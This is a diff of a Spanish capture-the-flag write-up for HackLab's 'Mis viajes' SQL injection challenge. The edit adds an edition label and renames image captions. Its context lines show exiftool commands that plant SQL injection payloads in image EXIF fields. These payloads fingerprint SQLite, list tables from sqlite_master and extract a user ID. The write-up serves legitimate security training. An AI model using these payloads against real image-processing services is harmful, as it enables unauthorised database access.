@@ -1,6 +1,7 @@
-# Desafío 27 - Mis viajes
+# Desafío 27 - Mis viajes (HackLab 2024)
 
 **Plataforma:** HackLab (SoftwareSeguro)  
+**Edición:** HackLab 2024  
 **Categoría:** SQL Injection  
 
 ## Análisis
@@ -19,15 +20,15 @@ exiftool -Make="',(SELECT sqlite_version())) --" -Model="payload_model" test.jpg
 
 Resultado: versión `3.40.1` → SQLite.
 
-![Desafío 27 - Mis viajes - imagen 1](assets/01.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 1](assets/01.png)
 
-![Desafío 27 - Mis viajes - imagen 2](assets/02.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 2](assets/02.png)
 
-![Desafío 27 - Mis viajes - imagen 3](assets/03.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 3](assets/03.png)
 
-![Desafío 27 - Mis viajes - imagen 4](assets/04.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 4](assets/04.png)
 
-![Desafío 27 - Mis viajes - imagen 5](assets/05.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 5](assets/05.png)
 
 Se enumeran las tablas de `sqlite_master`:
 
@@ -36,14 +37,14 @@ exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 0)||'" test.jp
 exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 1)||'" test.jpg_original
 ```
 
-![Desafío 27 - Mis viajes - imagen 6](assets/06.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 6](assets/06.png)
 
 ```bash
 exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 2)||'" test.jpg_original
 exiftool -Make="'||(SELECT sql FROM sqlite_master WHERE name='images')||'" test.jpg_original
 ```
 
-![Desafío 27 - Mis viajes - imagen 7](assets/07.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 7](assets/07.png)
 
 Se obtiene el `user_id` de la tabla `images`:
 
@@ -57,15 +58,15 @@ ID encontrado:
 1089b4a3-b6d0-450d-9c8a-b120b30bcb04
 ```
 
-![Desafío 27 - Mis viajes - imagen 8](assets/08.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 8](assets/08.png)
 
-![Desafío 27 - Mis viajes - imagen 9](assets/09.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 9](assets/09.png)
 
 Se copia el ID del usuario y se envía al endpoint correspondiente.
 
-![Desafío 27 - Mis viajes - imagen 10](assets/10.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 10](assets/10.png)
 
-![Desafío 27 - Mis viajes - imagen 11](assets/11.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 11](assets/11.png)
 
 ## Flag
 
